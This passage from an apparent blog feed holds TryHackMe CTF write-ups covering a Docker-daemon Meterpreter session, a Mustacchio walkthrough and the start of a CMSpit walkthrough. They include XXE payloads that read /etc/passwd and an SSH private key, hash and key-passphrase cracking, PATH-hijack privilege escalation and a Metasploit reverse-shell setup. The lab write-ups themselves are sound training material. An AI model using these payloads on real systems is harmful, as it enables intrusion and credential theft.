[*] Started reverse TCP handler on &amp;lt;Machine IP&amp;gt;:4444 
[*] The docker container is created, waiting for deploy
[*] Waiting for the cron job to run, can take up to 60 seconds
[*] Sending stage (3012548 bytes) to 10.10.59.151
[+] Deleted /etc/cron.d/GOKzWbNu
[+] Deleted /tmp/nCJrYRbW
[*] Meterpreter session 1 opened (&amp;lt;Machine IP&amp;gt;:4444 -&amp;gt; 10.10.59.151:41406) at 2021-08-13 16:39:05 +0100
[*] Session 1 created in the background.
msf6 exploit(linux/http/docker_daemon_tcp) &amp;gt; sessions 1
[*] Starting interaction with 1...

meterpreter &amp;gt; shell
Process 18578 created.
Channel 1 created.
whoami
root
ls -lah /root/root.txt
-rw-r--r-- 1 root root 26 Dec 18  2020 /root/root.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="easy" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">Mustacchio Write Up</title>
      <link href="https://darrynbrownfield.co.uk/mustacchio" rel="alternate" type="text/html" title="Mustacchio Write Up" />
      <published>2021-08-12T00:00:00+00:00</published>
      <updated>2021-08-12T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/mustacchio</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/mustacchio">&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/mustacchio&quot;&gt;mustacchio&lt;/a&gt; is a easy rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt; created by &lt;a href=&quot;https://tryhackme.com/p/zyeinn&quot;&gt;zyeinn&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;Although not required I added the machine IP to my host file so through out the write up I can use mustacchio.thm for consistency. Once added I started a nmap scan to check for available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial mustacchio.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:04 BST
Nmap scan report for mustacchio.thm (10.10.41.138)
Host is up (0.031s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.60 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - OpenSSH 7.2p2&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache 2.4.18&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I also ran a full port scan and found 1 additional port:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nmap -p- -oA nmap/full mustacchio.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-12 11:07 BST
Nmap scan report for mustacchio.thm (10.10.41.138)
Host is up (0.032s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8765/tcp open  ultraseek-http

Nmap done: 1 IP address (1 host up) scanned in 119.61 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;I started with port 80 and was presented with a very basic web page, there isnt really any functionally on the pages.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/index.png&quot; alt=&quot;index&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I ran a gobuster to check for other directories.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u http://mustacchio.thm -w /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 75
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://mustacchio.thm
[+] Threads:        75
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/08/12 11:11:22 Starting gobuster
===============================================================
/images (Status: 301)
/fonts (Status: 301)
/custom (Status: 301)
/server-status (Status: 403)
===============================================================
2021/08/12 11:11:34 Finished
===============================================================
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;/custom could be interesting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/custom.png&quot; alt=&quot;custom&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking in the js folder I found a file called users.bak, I downloaded the file to my machine.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/usersbak.png&quot; alt=&quot;usersbak&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Its a SQLite database.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $file users.bak 
users.bak: SQLite 3.x database, last written using SQLite version 3034001
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The database has one table called users with one record which is the username ‘admin’ and a hashed password which ive redacted from the output.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sqlite3 users.bak
SQLite version 3.31.1 2020-01-27 19:55:54
Enter &quot;.help&quot; for usage hints.
sqlite&amp;gt; .tables
users
sqlite&amp;gt; select * from users;
admin|&amp;lt;REDACTED&amp;gt;
sqlite&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The hash is SHA1, a great tool to use to identify hashes is hash-identifier.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $hash-identifier                                                       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: &amp;lt;REDACTED&amp;gt;

Possible Hashs:
[+] SHA-1
[+] MySQL5 - SHA-1(SHA-1($pass))
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I put the hash in a file called ‘hash’ and then used hashcat to crack it with the command &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcat -m 100 hash /usr/share/wordlists/rockyou.txt --force&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;The hash cracked within a few seconds, I looked around the webpage to find somewhere I could use the credentials but couldn’t find anything.&lt;/p&gt;

&lt;p&gt;I turned my attention to the other port 8765 and got an admin panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/login.png&quot; alt=&quot;login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I logged in with the credentials and was presented with a page to add a comment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/comment.png&quot; alt=&quot;comment&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looking at the source code, 3 things jumped out.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/source.png&quot; alt=&quot;source&quot; /&gt;&lt;/p&gt;

&lt;p&gt;1) Another backup file is referenced&lt;/p&gt;

&lt;p&gt;2) A username of Barry and a breadcumb to grab an SSH key if possible&lt;/p&gt;

&lt;p&gt;3) A reference to XML being used&lt;/p&gt;

&lt;p&gt;Clicking submit without any input presents an alert ‘Insert XML Code!’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/insertcode.png&quot; alt=&quot;insertcode&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I downloaded the dontforget.bak file by browsing to: http://mustacchio.thm:8765/auth/dontforget.bak&lt;/p&gt;

&lt;p&gt;Looking at the file its an XML example.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $cat dontforget.bak 
&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;comment&amp;gt;
  &amp;lt;name&amp;gt;Joe Hamd&amp;lt;/name&amp;gt;
  &amp;lt;author&amp;gt;Barry Clad&amp;lt;/author&amp;gt;
  &amp;lt;com&amp;gt;his paragraph was a waste of time and space. If you had not read this and I had not typed this you and I could’ve done something more productive than reading this mindlessl
y and carelessly as if you did not have anything else to do in life. Life is so precious because it is short and you are being so careless that you do not realize it until now sin
ce this void paragraph mentions that you are doing something so mindless, so stupid, so careless that you realize that you are not using your time wisely. You could’ve been playin
g with your dog, or eating your cat, but no. You want to read this barren paragraph and expect something marvelous and terrific at the end. But since you still do not realize that
 you are wasting precious time, you still continue to read the null paragraph. If you had not noticed, you have wasted an estimated time of 20 seconds.&amp;lt;/com&amp;gt;
&amp;lt;/comment&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I tried the example on the webpage and got the expected result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/test.png&quot; alt=&quot;test&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;initial-access&quot;&gt;Initial Access&lt;/h3&gt;

&lt;p&gt;It appears the next step is to use XML External Entiry (XXE) to grab barry’s SSH key to allow us to connect to the machine. Learning XXE is very much on my to do list so I went over to &lt;a href=&quot;https://portswigger.net/web-security/xxe&quot;&gt;port swigger academy&lt;/a&gt; which has a great training resource and found the following payload:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;
&amp;lt;stockCheck&amp;gt;&amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;&amp;lt;/stockCheck&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using the original example and the payload above I created my own payload to test XXE.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&amp;gt; ]&amp;gt;
&amp;lt;comment&amp;gt;
  &amp;lt;name&amp;gt;Daz&amp;lt;/name&amp;gt;
  &amp;lt;author&amp;gt;Please work...&amp;lt;/author&amp;gt;
  &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt;
&amp;lt;/comment&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It worked!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/mustacchio/testworked.png&quot; alt=&quot;testworked&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tweaked the payload to grab barrys SSH key.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&amp;gt;
&amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &quot;file:///home/barry/.ssh/id_rsa&quot;&amp;gt; ]&amp;gt;
&amp;lt;comment&amp;gt;
  &amp;lt;name&amp;gt;Daz&amp;lt;/name&amp;gt;
  &amp;lt;author&amp;gt;Please work...&amp;lt;/author&amp;gt;
  &amp;lt;com&amp;gt;&amp;amp;xxe;&amp;lt;/com&amp;gt;
&amp;lt;/comment&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Again this worked, however looking at the key it is encrypted so before I can use it to login I need to crack it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;  GNU nano 4.9.2                                       
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E
&amp;lt;redacted&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used ssh2john to generate a hash and saved it to a file called keyhash.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $/usr/share/john/ssh2john.py key &amp;gt; keyhash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then using john and the rockyou wordlist I was able to get the keys password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $john keyhash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
&amp;lt;redacted&amp;gt;       (key)
1g 0:00:00:05 DONE (2021-08-12 11:30) 0.1779g/s 2551Kp/s 2551Kc/s 2551KC/sa6_123..*7¡Vamos!
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;To use the key I used chmod 600 and was able to login.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $chmod 600 key
┌─[daz@parrot]─[~/Documents/TryHackMe/Mustacchio]
└──╼ $ssh -i key barry@mustacchio.thm
Enter passphrase for key 'key': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Aug 12 10:31:58 2021 from 10.8.21.217
barry@mustacchio:~$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;While enumerating the machine I found another user directory. Within this directory was a ELF file owned by root but executable by all.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;barry@mustacchio:~$ cd /home/joe/
barry@mustacchio:/home/joe$ ls
live_log
barry@mustacchio:/home/joe$ file live_log 
live_log: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6c03a68094c63347aeb02281a455189
64ad12abe, for GNU/Linux 3.2.0, not stripped
barry@mustacchio:/home/joe$ ls -lah live_log 
-rwsr-xr-x 1 root root 17K Jun 12 15:48 live_log
barry@mustacchio:/home/joe$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the file it appears to just be reading the HTTP access logs for port 8765.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;barry@mustacchio:/home/joe$ ./live_log 
10.8.21.217 - - [12/Aug/2021:10:20:02 +0000] &quot;GET /home.php HTTP/1.1&quot; 200 1077 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:20:27 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1077 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:21:00 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1123 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:23:47 +0000] &quot;GET /auth/dontforget.bak HTTP/1.1&quot; 200 996 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:25:24 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1123 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:25:25 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1563 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:26:37 +0000] &quot;GET /home.php HTTP/1.1&quot; 200 1077 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:27:01 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 1782 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:27:39 +0000] &quot;GET /home.php HTTP/1.1&quot; 200 1077 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0&quot;
10.8.21.217 - - [12/Aug/2021:10:28:20 +0000] &quot;POST /home.php HTTP/1.1&quot; 200 2573 &quot;http://mustacchio.thm:8765/home.php&quot; &quot;Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefo
x/68.0&quot;
^CLive Nginx Log Readerbarry@mustacchio:/home/joe$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I used strings to look at the file and found the line:&lt;/p&gt;

&lt;p&gt;tail -f /var/log/nginx/access.log&lt;/p&gt;

&lt;p&gt;Because the tail command is not using an absolute path, we should be able to get privilege escalation by using the PATH variable. Raj Chandel has a great &lt;a href=&quot;https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/&quot;&gt;blog&lt;/a&gt; about this technique.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;barry@mustacchio:/home/joe$ 
barry@mustacchio:/home/joe$ cd /tmp
barry@mustacchio:/tmp$ echo &quot;/bin/bash&quot; &amp;gt; tail
barry@mustacchio:/tmp$ chmod +x tail 
barry@mustacchio:/tmp$ export PATH=/tmp:$PATH
barry@mustacchio:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:/tmp$ /home/joe/live_log 
root@mustacchio:/tmp# whoami
root
root@mustacchio:/tmp# 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

&lt;p&gt;============================================================&lt;/p&gt;

&lt;p&gt;Any comments or feedback welcome! You can find me on &lt;a href=&quot;https://twitter.com/dazbrownfield&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.buymeacoffee.com/dazbrownfield&quot; target=&quot;_blank&quot;&gt;&lt;img src=&quot;https://cdn.buymeacoffee.com/buttons/v2/default-blue.png&quot; alt=&quot;Buy Me A Coffee&quot; style=&quot;height: 60px !important;width: 217px !important;&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content>

      
      
      
      
      

      <author>
          <name>Darryn</name>
        
        
      </author>

      

      
        <category term="tryhackme" />
      
        <category term="ctf" />
      
        <category term="easy" />
      

      
        <summary type="html"></summary>
      

      
      
    </entry>
  
    <entry>
      <title type="html">CMSpit Write Up</title>
      <link href="https://darrynbrownfield.co.uk/cmspit" rel="alternate" type="text/html" title="CMSpit Write Up" />
      <published>2021-08-08T00:00:00+00:00</published>
      <updated>2021-08-08T00:00:00+00:00</updated>
      <id>https://darrynbrownfield.co.uk/cmspit</id>
      <content type="html" xml:base="https://darrynbrownfield.co.uk/cmspit">&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/cover.png&quot; alt=&quot;cover&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/cmspit&quot;&gt;cmspit&lt;/a&gt; is a medium rated CTF room on &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. This was a good machine highlighting recent CVE’s, thanks &lt;a href=&quot;https://twitter.com/_stuxnet&quot;&gt;stuxnet&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;Although not required I added a entry in my hosts file with the machine IP to cmspit.thm. Once added I started a nmap scan to check for available ports.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $sudo nmap -sC -sV -oA nmap/initial cmspit.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2021-08-08 11:11 BST
Nmap scan report for cmspit.thm (10.10.34.218)
Host is up (0.035s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.50 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;22 - SSH - OpenSSH 7.2p2&lt;/li&gt;
  &lt;li&gt;80 - HTTP - Apache 2.4.18&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I ran a full port scan but no additional ports were found.&lt;/p&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Clearly this is going to be a web challenge, while I poked around the website I wanted some enumeration going on in the background so started Gobuster and Nikto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $gobuster dir -u cmspit.thm -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://cmspit.thm
[+] Threads:        10
[+] Wordlist:       /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/08/08 11:16:09 Starting gobuster
===============================================================
Error: the server returns a status code that matches the provided options for non existing urls. http://cmspit.thm/fbaebb24-03e7-4123-b75f-01915dfcbf6b =&amp;gt; 302. To force processi
ng of Wildcard responses, specify the '--wildcard' switch
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;However is looks like all requests are being sent to ‘http://cmspit.thm/auth/login?to=/’&lt;/p&gt;

&lt;p&gt;However, I did have some more luck with Nikto.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;└──╼ $nikto -h cmspit.thm
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.34.218
+ Target Hostname:    cmspit.thm
+ Target Port:        80
+ Start Time:         2021-08-08 11:18:16 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Cookie 8071dec2be26139e39a170762581c00f created without the httponly flag
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: /auth/login?to=/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ OSVDB-3233: /icons/README: Apache default file found.
+ Retrieved access-control-allow-origin header: *
+ /server-status: Apache server-status interface found (protected/forbidden)
+ /composer.json: PHP Composer configuration file reveals configuration information - https://getcomposer.org/
+ /package.json: Node.js package file found. It may contain sensitive information.
+ 7789 requests: 3 error(s) and 10 item(s) reported on remote host
+ End Time:           2021-08-08 11:25:02 (GMT1) (406 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I went to http://cmspit.thm/ which redirected me to http://cmspit.thm/auth/login?to=/. I tried some basic username and password combinations but nothing worked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/homepage.png&quot; alt=&quot;homepage&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the logo and name on the authentication page, its clear we are working with Cockpit CMS. I checked the source code and found the version 0.11.1. This was also confirmed by going to http://cmspit.thm/package.json found via Nikto.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/cmspit/version.png&quot; alt=&quot;version&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I googled ‘cockpit cms 0.11.1 exploit’ and found a great &lt;a href=&quot;https://swarm.ptsecurity.com/rce-cockpit-cms/&quot;&gt;blog&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/ultrayoba&quot;&gt;Nikita Petrov&lt;/a&gt;, however im lazy and also found a metasploit module.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 &amp;gt; search cockpit

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   0  exploit/multi/http/cockpit_cms_rce  2021-04-13       normal  Yes    Cockpit CMS NoSQLi to RCE


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/cockpit_cms_rce

msf6 &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I selected the module using the command ‘use 0’ and filled out the options.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;msf6 exploit(multi/http/cockpit_cms_rce) &amp;gt; show options

Module options (exploit/multi/http/cockpit_cms_rce):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   ENUM_USERS  true             no        Enumerate users
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS      cmspit.thm       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The URI of Cockpit
   USER                         no        User account to take over
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
